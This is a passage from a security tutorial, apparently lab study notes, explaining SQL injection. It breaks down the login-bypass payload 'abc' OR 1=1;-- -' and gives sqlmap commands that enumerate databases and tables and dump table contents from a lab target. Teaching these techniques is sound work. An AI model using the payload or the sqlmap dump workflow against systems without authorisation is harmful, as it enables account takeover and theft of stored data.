 websites and applications interact with databases to store, modify, and retrieve their data in a structured manner

## Overview
SQL Injection (SQLi) occurs when a web application takes user input and passes it directly into a database query without properly sanitizing or validating it. This allows an attacker to manipulate the input field to write their own SQL commands, which the database then executes. 

> **Disclaimer:** Only perform SQL injection (manual or automated) on applications where you have explicit permission from the owner.

## How Normal Authentication Works
When a user logs in, the application takes the input and inserts it into a backend SQL query.
* **Input:** Username: `John` | Password: `Un@detectable444`
* **Resulting Query:** `SELECT * FROM users WHERE username = 'John' AND password = 'Un@detectable444';`

The database checks if both the username **AND** the password match. If true, access is granted.



## The Attack (Auth Bypass)
If the input fields lack sanitization, an attacker can trick the database into evaluating a false password as "True" by injecting a logical condition.

* **Target Username:** `John`
* **Injected Password:** `abc' OR 1=1;-- -`
* **Resulting Malicious Query:**
  `SELECT * FROM users WHERE username = 'John' AND password = 'abc' OR 1=1;-- -';`

### Payload Breakdown
Here is exactly what the payload `abc' OR 1=1;-- -` does to the query:

| Character(s) | Purpose | Explanation |
| :--- | :--- | :--- |
| `abc` | **Dummy Data** | A random password guess. This will evaluate to False. |
| `'` | **The Breakout** | The single quote is the most critical piece. It tricks the database into thinking the password string has ended early (closing the quote the developer wrote). |
| `OR` | **Logical Operator** | Tells the database: "If the first condition (password='abc') is false, try this next condition." |
| `1=1` | **Always True** | Since 1 always equals 1, this condition evaluates to True. Because of the `OR` operator, the entire password check becomes True. |
| `;` | **Statement End** | Tells the database the SQL command is finished. |
| `-- -` | **The Comment** | Comments out the rest of the original query (like the developer's original closing quote `';`). This prevents the query from crashing due to syntax errors. |

**The Result:** The database sees `WHERE username = 'John' AND (False OR True)`. Because `False OR True` equals `True`, the query succeeds, and the attacker is logged into John's account without knowing the real password.

## Automated SQL injection tool

## Overview
SQLMap automates the discovery and exploitation of SQL injection vulnerabilities. Instead of manually guessing logical errors (like `' OR 1=1`), SQLMap rapidly fires hundreds of payloads to map out and extract backend databases.

## Target Selection
How you feed the target to SQLMap depends on how the web application sends data:

* **GET Parameters (Visible in URL):**
  Use the `-u` flag.
  *Example:* `sqlmap -u "http://target.thm/search?cat=1"`
* **POST Parameters (Hidden in Forms/Logins):**
  Capture the raw HTTP request using an interceptor (like Burp Suite), save it as a text file, and use the `-r` flag.
  *Example:* `sqlmap -r intercepted_login.txt`

## The 3-Step Extraction Workflow
You must extract the database structure hierarchically.

### 1. Enumerate Databases (`--dbs`)
Find the names of the databases on the server.
> `sqlmap -u "http://target.thm/search?cat=1" --dbs`

### 2. Enumerate Tables (`--tables`)
Target a specific database (`-D`) to find its tables.
> `sqlmap -u "http://target.thm/search?cat=1" -D users --tables`

### 3. Dump the Data (`--dump`)
Target a specific table (`-T`) within a specific database (`-D`) to extract the actual rows/records.
> `sqlmap -u "http://target.thm/search?cat=1" -D users -T thomas --dump`

## Useful Optional Flags
| Flag | Description |
| :--- | :--- |
| `--wizard` | Runs SQLMap in an interactive, beginner-friendly prompt mode. |
| `--cookie` | Passes a session cookie to test pages that require authentication. |
| `--batch` | Automatically answers "Yes" to all default prompts so the scan runs without pausing. |